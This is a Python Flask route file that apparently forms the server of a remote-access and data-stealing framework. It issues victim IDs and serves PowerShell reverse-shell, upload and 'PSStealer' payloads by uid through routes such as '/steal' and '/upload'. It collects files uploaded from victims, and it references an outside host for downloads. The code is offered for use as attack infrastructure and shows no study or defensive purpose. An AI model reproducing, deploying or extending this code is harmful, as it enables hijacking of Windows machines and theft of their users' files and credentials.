from flask import request,jsonify,render_template,Blueprint,current_app,send_file,abort
from ecs.funcs import *
from ecs.shell import return_shell
url = 'https://rev.rcsis.ir/down/access'


main_blueprint = Blueprint('main', __name__)



@main_blueprint .route('/', methods=['GET'])
def main():
    data = request.args
    uid = data.get('uid')
    step = data.get('s')
    if step == '3':
        return return_shell(file="shells/pws/PSShell",request=request)
    
    elif step == '4':
        response =   (read_file(f"shells/pws/PSAccess")).replace("{uid}",f"{uid}")
        return response,200
    elif step == '5':
        response = read_file(f"clients/{uid}/{uid}.ps1")
        if(response):
            return response,200
        else:
            pass
    context = {
        'uid': uid,
        'step': step,
    }
    content = render_template('control.html',**context)
    return content





@main_blueprint .route('/uid', methods=['GET'])
def uid():
    uid = generate_uid()
    return jsonify({"uid": uid})




@main_blueprint .route('/test', methods=['POST','GET'])
def test():
    file = request.files.items()
    response = ""
    for key, value in request.files.items():
        response = response + f"Key: {key}, Value: {value}"
    print(response)
    return response,200




@main_blueprint .route('/upload', methods=['POST','GET'])
def upload_file():
    data = request.args
    uid = data.get('uid')
    if request.method == 'GET':
        OS = User_Os(request.headers.get('User-Agent'))
        if OS == 'Windows':
            uploadshell = read_file(f'shells/pws/PSUpload')
            uploadshell = uploadshell.replace("{uid}",f"{uid}")
            return f"{uploadshell}",200
        else:
             return f"{OS} is no valid yet",404
    
    elif request.method == 'POST':
        # Check if the post request has the file part
        if 'file' not in request.files:
            return jsonify({"error": "No file part"}), 400
        file = request.files['file']
        # If user does not select file, browser also submits an empty part without filename
        if file.filename == '':
            return jsonify({"error": "No selected file"}), 400
        # Save the file
        try:
            file_path = f'{sys.path[0]}/clients/{uid}/uploads/{file.filename}'
            file.save(f"{file_path}")
        except:
            file_path = f'{sys.path[0]}/uploads/{file.filename}'
            file.save(f"{file_path}")            
        return jsonify({"message": "File successfully uploaded", "file_path": file_path}), 200



@main_blueprint .route('/down/<filename>', methods=['GET'])
def download(filename):
    if request.method == 'GET':
        directory = f'{sys.path[0]}/downloads/'
        try:
         # Send the file to the client
            return send_file(f"{directory}{filename}", as_attachment=True)
        except Exception as e:
            return f"ready golam 🌹",404
    


@main_blueprint .route('/steal', methods=['GET'])
def steal():
    if request.method == 'GET':
        data = request.args
        uid = data.get('uid')
        detail = read_file(f'clients/{uid}/{uid}.conf')
        if detail:
            response = read_file(f'shells/pws/PSStealer').replace("{uid}",uid)
            return f"{response}", 200
        else:
            response = "UID Not Found"
            return f"{response}", 404
